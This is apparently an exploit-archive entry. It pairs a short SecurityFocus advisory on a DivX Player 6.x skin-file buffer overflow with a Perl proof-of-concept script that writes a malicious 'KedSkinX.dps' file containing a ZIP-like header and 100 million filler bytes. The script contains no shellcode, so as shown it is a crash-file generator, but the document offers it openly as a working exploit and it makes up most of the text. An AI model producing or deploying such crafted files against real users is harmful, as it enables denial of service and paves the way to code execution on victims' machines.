source: http://www.securityfocus.com/bid/46609/info

DivX Player is prone to a remote buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied input.

Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.

DivX Player 6.x versions are vulnerable. 

#!/usr/bin/perl

###
# Title : DivX Player 'Skins' V<=6.8.2.1 Buffer Overflow
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Twitter page : twitter.com/kedans
# Tested on : windows XP SP3 Fran�ais & Arabic
# Target :  DivX Player Version 6.8.2.1 and all Versions 6.x
###

# Note : This Exploit BOF is Special Greets to Member ' Overfolw ' From sec4ever.com

#START SYSTEM /root@MSdos/ :
system("title KedAns-Dz");
system("color 1e");
system("cls");

print "\n\n".                  
      "          ||========================================||\n".
	  "      ||                                        ||\n".
	  "      ||   DivX Player 'Skins' V<=6.8.2.1       ||\n".
	  "      ||      Exploit Buffer Overflow           ||\n".
	  "      ||    Created BY KedAns-Dz                ||\n".
	  "      ||   ked-h(at)hotmail(dot)com             ||\n".
	  "      ||                                        ||\n".
	  "      ||========================================||\n\n\n";
sleep(2);
print "\n";
print " [!] Please Wait Till c0de Generate...\n";
my $ked = "\x41" x 100000000 ; # Integer Overflow
my $Buf = 
"\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00\x7b\x4f\x39\x38\x56\x1f". # Skin index
"\xbf\xe7\x06\x45\x00\x00\x8b\x45\x00\x00".
"$ked\x3e"; # end Skin index
$file = "KedSkinX.dps"; # Evil File ( Divx.Player.Skin ) 
open (F ,">$file");
print F $Buf;
sleep (2);
print "\n [+] Creat File : $file , Succesfully ! \n";
close (F);

#================[ Exploited By KedAns-Dz * HST-Dz * ]=========================
# GreetZ to : Islampard * Dr.Ride * Zaki.Eng * BadR0 * NoRo FouinY * Red1One
# XoreR * Mr.Dak007 * Hani * TOnyXED * Fox-Dz * Massinhou-Dz ++ all my friends ;
# > Algerians <  [D] HaCkerS-StreeT-Team [Z] > Hackers <
# My Friends on Facebook : Nayla Festa * Dz_GadlOl * MatmouR13 ...all Others
# 4nahdha.com : TitO (Dr.Ride) *  MEN_dz * Mr.LAK (Administrator) * all members ...
# sec4ever.com members Dz : =>>
#  Ma3sTr0-Dz * Indoushka * MadjiX * BrOx-Dz * JaGo-Dz ... all Others
# hotturks.org : TeX * KadaVra ... all Others
# Kelvin.Xgr ( kelvinx.net)
#===========================================================================